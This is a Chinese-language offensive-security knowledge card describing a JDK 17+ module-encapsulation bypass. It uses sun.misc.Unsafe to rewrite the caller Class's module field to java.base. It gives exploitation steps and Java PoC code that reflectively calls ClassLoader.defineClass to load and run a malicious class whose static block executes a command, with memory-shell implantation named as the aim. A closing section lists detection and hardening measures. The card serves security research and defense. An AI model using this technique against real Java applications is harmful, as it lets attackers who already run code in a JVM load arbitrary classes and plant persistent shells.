---
id: web-java-classloader-jdk17-class-module-field-spoof
title: JDK 17+ 强封装绕过：Unsafe 篡改调用者 Class.module 伪装为 java.base
type: scenario
domain: web
path: web/java/classloader
technique: unsafe-class-module-field-spoof
aliases:
- Class.module 篡改
- 调用者模块伪装
- Unsafe 绕过 InaccessibleObjectException
- JDK17 模块封装绕过
- hack the module field
tags:
- java
- jdk
- unsafe
- module-system
- reflection
- setaccessible
- defineclass
- memory-shell
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-05'
affected_versions: JDK 17+
verification:
  verified_by: verifier-V8
  verified_at: '2026-11-05T00:28:05+08:00'
  notes: 已对照原文与图 01-03 核对：JDK17.0.12 下 ClassLoader.defineClass 的 setAccessible 抛 InaccessibleObjectException、checkCanSetAccessible 的 java.base/unnamed module 分支、Unsafe.objectFieldOffset 取 Class.module 偏移并 putObject 改为 Object.class.getModule() 后 defineClass 成功执行 calc，均与原文一致；affected_versions 按原文‘JDK17强封装/高版本JDK’标为 JDK 17+，未在本机复现。
---

## 一句话结论

JDK 17 强封装下 `setAccessible(true)` 会检查调用者模块；可用 `sun.misc.Unsafe` 按内存偏移把当前调用者 `Class` 对象的 `module` 字段改写为 `java.base` 的 `Module`，让 `checkCanSetAccessible()` 误判调用者与 `java.lang` 同属 `java.base`，从而重新获得对 `ClassLoader.defineClass` 等内部成员的反射权限。

## 原理

- JDK 9 引入模块系统后，模块外的代码只能访问目标模块显式 `exports`/`opens` 的包。JDK 17 的强封装默认拒绝通过反射访问 `java.*` 的非公共成员，`Field`/`Method.setAccessible(true)` 会抛 `InaccessibleObjectException`。
- `AccessibleObject.setAccessible()` 在 JDK 17 中先调用 `checkCanSetAccessible(Reflection.getCallerClass())`。该方法的关键判断包括：
  - 调用者模块与声明模块相同 → 允许；
  - 调用者模块是 `Object.class.getModule()`（即 `java.base`）→ 允许；
  - 声明模块是未命名模块（classpath）→ 允许；
  - 类 public 且包已 `exports` 给调用者，且成员 public（或 protected static 且调用者是子类）→ 允许；
  - 包已 `opens` 给调用者 → 允许。
- 正常 classpath 代码的调用者模块是“unnamed module”，声明模块是 `java.base`，`java.lang` 没有 `opens` 给未命名模块，因此 `ClassLoader.defineClass` 的 `setAccessible` 被拒绝。
- 每个 `Class` 对象内部有一个 `module` 字段（`java.lang.Class` 的私有字段），指向该类的 `Module`。`Unsafe.objectFieldOffset(Class.class.getDeclaredField("module"))` 可以取得该字段在 `Class` 对象中的内存偏移；`Unsafe.putObject(callerClass, offset, Object.class.getModule())` 直接把调用者类的 module 引用改成 `java.base`。
- 之后再次调用 `setAccessible` 时，`checkCanSetAccessible` 看到 `callerModule == Object.class.getModule()`，走“调用者模块是 java.base”分支返回 true，模块检查被绕过。
- `Class.getDeclaredField("module")` 只取字段元数据，不触发模块 opens 检查；真正危险的是 `Unsafe.putObject` 的原生内存写，它不经过 Java 反射/模块访问控制。
- 该手法不依赖 `--add-opens`，也不需要读取 `IMPL_LOOKUP`；它直接伪造“我是 java.base”的身份，属于模块字段级别的欺骗。

## 触发条件

- 目标为 JDK 17+（默认强封装），且 `jdk.unsupported` 模块未被 `--limit-modules` 排除，`sun.misc.Unsafe` 可用。
- 攻击者已在目标 JVM 内取得代码执行（反序列化、表达式注入、Agent、JSP 等），运行在未命名模块/classpath。
- 进程未启用会拦截 `setAccessible` 的自定义 SecurityManager（JDK 21 默认无 SecurityManager）。
- 目标内部成员所在的包未对调用者 `opens`（否则无需绕过）。

## 利用步骤

1. 通过 `Unsafe.class.getDeclaredField("theUnsafe")` + `setAccessible(true)` 取得 `sun.misc.Unsafe` 实例（`jdk.unsupported` 显式 opens `sun.misc`）。
2. 取得 `Class.class.getDeclaredField("module")` 的字段偏移：
   `long addr = unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));`
3. 把当前调用者类的 module 改成 `Object.class.getModule()`（java.base）：
   `unsafe.putObject(Demo.class, addr, Object.class.getModule());`
4. 反射获取目标内部方法（如 `ClassLoader.defineClass`），此时 `setAccessible(true)` 不再抛 `InaccessibleObjectException`。
5. 调用 `defineClass` 加载攻击者字节码，或继续反射其他 `java.base` 内部成员。
6. 触发加载类的静态初始化块/实例化，执行命令或植入内存马。

## PoC

```java
import sun.misc.Unsafe;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class Demo {
    public static void main(String[] args) throws Exception {
        // 1. 取得 Unsafe
        Field f = Unsafe.class.getDeclaredField("theUnsafe");
        f.setAccessible(true);
        Unsafe unsafe = (Unsafe) f.get(null);

        // 2. 把当前类的 module 字段改成 java.base
        long addr = unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));
        unsafe.putObject(Demo.class, addr, Object.class.getModule());

        // 3. 现在可以 setAccessible 访问 java.base 内部方法
        Method defineClass = ClassLoader.class.getDeclaredMethod(
            "defineClass", String.class, byte[].class, int.class, int.class);
        defineClass.setAccessible(true);

        // 4. 定义并实例化恶意类（Evil 的 static 块执行 calc）
        Class<?> evil = (Class<?>) defineClass.invoke(
            ClassLoader.getSystemClassLoader(), "Evil", evilBytes, 0, evilBytes.length);
        evil.newInstance();
    }
}
```

```java
// 恶意类：静态初始化块执行命令
public class Evil {
    static {
        try { Runtime.getRuntime().exec("calc"); } catch (Exception ignored) {}
    }
}
```

```text
# 未 patch module 时：
java.lang.reflect.InaccessibleObjectException:
  Unable to make protected final java.lang.Class java.lang.ClassLoader.defineClass(...)
  accessible: module java.base does not "opens java.lang" to unnamed module

# patch 后：defineClass 调用成功，Evil 静态块执行，计算器弹出。
```

## 变体与关联

- 变体：把调用者 module 改成目标内部成员所在模块（不一定是 java.base），使 `callerModule == declaringModule` 分支成立。
- 变体：用 `Unsafe.getAndSetObject` 批量把多个类/对象的 module 指向目标模块（原文的 `patchModule(ArrayList<Class>)` 工具方法）。
- 变体：不 patch module，改为读取 `MethodHandles.Lookup.IMPL_LOOKUP` 获得 TRUSTED Lookup（见关联卡片），或用 `--add-opens` 启动参数（需要重启）。
- 关联：[[web-java-classloader-jdk-module-encapsulation-bypass-unsafe-impl-lookup]]（同一 JDK17 强封装问题的另一条 Unsafe 绕过：IMPL_LOOKUP 内存直读）；[[web-java-classloader-unsafe-anonymous-class-jsp-shell]]（Unsafe.defineAnonymousClass 加载字节码）；[[web-java-deser-c3p0-poolbackeddatasourcebase-urlclassloader]]（获得代码执行后的后续利用）。
- 边界：需要 `sun.misc.Unsafe` 可用且能取得 `theUnsafe`；`--limit-modules` 排除 `jdk.unsupported`、自定义 SecurityManager 拦截、或 JDK 未来移除 Unsafe 时失效。`module` 字段名/布局随 JDK 版本可能变化，需按目标版本确认。

## 检测与防御

- 检测：监控对 `sun.misc.Unsafe.theUnsafe` 的反射访问；监控 `Unsafe.objectFieldOffset(Class.class.getDeclaredField("module"))` 与 `Unsafe.putObject/getAndSetObject` 对 `Class` 对象的写操作；监控 `ClassLoader.defineClass` 的反射调用与异常类名。
- 修复/加固：`java --limit-modules java.base,...` 排除 `jdk.unsupported`；使用 `--add-opens` 精确开放必要包而非全局放开；升级 JDK 并关注 Unsafe 移除路线（JEP 471）。
- 缓解：RASP/Agent 对 `Unsafe` 内存写和 `setAccessible` 插桩告警；启用 SecurityManager（过渡）拦截 `suppressAccessChecks`；最小化 classpath 代码执行入口。
